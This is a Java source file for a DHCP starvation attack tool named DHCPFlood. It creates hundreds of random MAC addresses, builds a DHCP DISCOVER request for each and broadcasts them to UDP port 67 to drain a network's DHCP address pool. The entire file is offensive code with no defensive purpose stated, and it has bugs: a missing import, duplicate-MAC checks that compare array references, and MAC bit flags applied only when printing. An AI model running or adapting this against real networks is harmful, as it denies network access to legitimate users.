import org.onlab.packet.dhcp.DhcpOption;

import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import static java.lang.System.out;

public class DHCPFlood {

    private static ArrayList<byte[]> macsList = new ArrayList<>();

    DHCPFlood(){
        for(int i = 0; i < 250; i++) randomMacAddress();
    }

    DHCPFlood(int n){
        for(int i = 0; i < n; i++) randomMacAddress();
    }

    private static void randomMacAddress(){
        Random rand = new Random();
        byte[] macAddr = new byte[6];
        for(int i = 0; i < macAddr.length; i++){
            macAddr[i] = (byte)rand.nextInt(127);
        }
        if(checkMac(macAddr))
            macsList.add(macAddr);
    }

    private static boolean checkMac(byte[] mac){
        if (macsList.contains(mac)) return false;
        else return true;
    }

    private static byte[] messageConstructor(int id, byte[] mac){
        DHCP dhcp = new DHCP();
        byte[] data = new byte[1];
        byte op = 0x1, htype = 0x1, hlen = 0x6;
        data[0] = 0x1;
        dhcp.setOpCode(op);
        dhcp.setHardwareType(htype);
        dhcp.setHardwareAddressLength(hlen);
        dhcp.setFlags((short)1);
        dhcp.setTransactionId(id);
        dhcp.setClientHardwareAddress(mac);
        List<DhcpOption> optionList = new ArrayList<DhcpOption>();
        DhcpOption messageType = new DhcpOption();
        messageType.setCode((byte)53);
        messageType.setLength((byte)1);
        messageType.setData(data);
        optionList.add(messageType);
        DhcpOption reqParam = new DhcpOption();
        reqParam.setCode((byte)55);
        reqParam.setLength((byte)4);
        byte[] requestedParams = {1, 3, 15, 6};
        reqParam.setData(requestedParams);
        optionList.add(reqParam);
        DhcpOption endOption = new DhcpOption();
        endOption.setCode((byte)255);
        endOption.setLength((byte)1);
        optionList.add(endOption);
        dhcp.setOptions(optionList);
        byte[] message = dhcp.serialize();
        return message;
    }

    public static void sendPacket() {
        Random rand = new Random();
        byte[] message = null;
        DatagramSocket socket;

        int serverPort = 67;
        ArrayList<byte[]> macs = getMacsList();
        String ServerIP = "255.255.255.255";
        try{
            socket = new DatagramSocket(68);
            DatagramPacket p;
            for(int i = 0; i < macs.size(); i++){
                message = messageConstructor(rand.nextInt(65636), macs.get(i));
                p = new DatagramPacket(message, message.length, InetAddress.getByName(ServerIP), serverPort);
                out.println("Sending data to " + p.getAddress().toString());
                socket.send(p);
            }
        }catch(SocketException ex){
            ex.printStackTrace();
        }catch (UnknownHostException ex){
            ex.printStackTrace();
        }catch(IOException ex){
            ex.printStackTrace();
        }
    }

    public static byte[] receivePacket(DatagramSocket socket){
        out.println("Listening on port " + 68 + "...");
        DatagramPacket p = new DatagramPacket(new byte[1024], 1024);

        try{
            socket.receive(p);
        }catch (SocketException ex){
            ex.printStackTrace();
        }catch (IOException ex){
            ex.printStackTrace();
        }
        return p.getData();
    }

    public static ArrayList<byte[]> getMacsList(){
        return macsList;
    }

    public static void printMasList(){
        StringBuilder sb = null;
        for(int i = 0; i < macsList.size(); i++){
            sb = new StringBuilder(18);
            for(byte b : macsList.get(i)){
                if(sb.length() > 0){
                    sb.append(":");
                }else{ //first byte, we need to set some options
                    b = (byte)(b | (byte)(0x01 << 6)); //locally adminstrated
                    b = (byte)(b | (byte)(0x00 << 7)); //unicast

                }
                sb.append(String.format("%02x", b));
            }
            System.out.println("MAC №" + (i + 1) + ": " + sb);
        }
    }

    public static byte[] getMac(int index) {
        return macsList.get(index);
    }
}

